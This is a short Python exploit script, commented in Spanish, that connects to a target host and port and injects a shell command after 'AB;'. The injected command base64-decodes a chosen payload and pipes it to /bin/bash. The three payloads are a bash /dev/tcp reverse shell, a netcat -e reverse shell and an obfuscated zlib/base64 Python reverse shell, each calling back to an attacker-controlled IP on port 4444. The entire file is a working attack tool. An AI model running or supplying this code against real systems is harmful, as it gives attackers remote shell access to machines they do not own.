import argparse
import socket
import base64

# Configuración del analizador de argumentos
parser = argparse.ArgumentParser()
parser.add_argument('ip', help='IP objetivo')
parser.add_argument('port', help='Puerto objetivo', type=int)
parser.add_argument('-payload', help='Tipo de payload', required=True, choices=['python', 'netcat', 'bash'])
args = parser.parse_args()

# IP y puerto locales para la conexión
local_ip = '192.168.1.23'  # Cambiar según tu IP local
local_port = '4444'  # Cambiar según el puerto que desees usar

# Payloads
python_payload = f'python -c "exec(__import__(\'zlib\').decompress(__import__(\'base64\').b64decode(__import__(\'codecs\').getencoder(\'utf-8\')(\'eNo9UE1LxDAQPTe/IrckGMO21rIuVhDxICKCuzeRpU1GDU2TkmS1Kv53G7I4hxnezJs3H3qcnI84ODlA5N9G97zvAjQ1D9EfZORRj4Benccz1hb7zr4BLVdsg4rovxZfhDY3ixxoxY94+3hzv9/unm6vH1jiCemsBRkpJeVFJcpmLUpRnRFeL8YSpffQDaiAWcIUk3YaLoIBmOg5Q6bNO4mDnTo5UHJ1R3gQHuQHXQSeVy9ItUdsGPp81wawAUsVuzSLnDr5r57mNEMwg6TpbKFAunHyEALNHxB9U6ekgsTkPySQTfhl6A/TF17/\')[0])))"'

bash_payload = f'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'

netcat_payload = f'nc -e /bin/bash {local_ip} {local_port}'

try:
	s = socket.create_connection((args.ip, args.port))
except socket.error as error:
	print('connection to target failed...')
	print(error)
	
def gen_payload(payload_type):
	base = base64.b64encode(payload_type.encode())
	return f'echo {base.decode()} |base64 -d|/bin/bash'
	
if args.payload == 'python':
	try:
		s.sendall((f'AB; {gen_payload(python_payload)} \n').encode())
	except:
		print('connection made, but failed to send exploit...')
		
if args.payload == 'netcat':
	try:
		s.sendall((f'AB; {gen_payload(netcat_payload)} \n').encode())
	except:
		print('connection made, but failed to send exploit...')
		
if args.payload == 'bash':
	try:
		s.sendall((f'AB; {gen_payload(bash_payload)} \n').encode())
	except:
		print('connection made, but failed to send exploit...')
		
data = s.recv(1024)
s.close()
if data != '':
	print('Exploit sent successfully')
	 
